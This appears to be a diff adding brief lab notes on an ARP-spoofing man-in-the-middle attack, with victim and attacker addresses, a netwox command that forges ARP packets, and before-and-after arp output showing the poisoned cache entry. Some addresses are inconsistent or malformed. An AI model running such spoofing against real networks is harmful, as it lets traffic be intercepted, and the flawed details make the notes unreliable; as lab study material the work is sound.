@@ -1,0 +1,23 @@
+# Man in the middle example
+#
+# VICTIM
+#	MAC: 08:00:27:A6:EB:87
+#   IP: IP: 192.168.0.102
+
+# Some other node
+#   MAC: 08:00:27:93:07:7e
+#	IP: 192.168.0.103
+
+# ATTACKER (Man in the middle)
+#	MAC: 08:00:27:ee:0d:0f
+# 	IP: IP: 192.168.101
+sudo netwox 33 -b 08:00:27:A6:EB:87 -g 192.168.0.103 -h 08:00:27:A6:EB:86 -i 192.168.0.101
+
+
+# Before attack
+seed@victim: arp-a
+(192.168.0.103) at 08:00:27:93:07:7e
+
+# After attack
+seed@victim: arp-a
+(192.168.0.103) at 08:00:27:ee:0d:0f
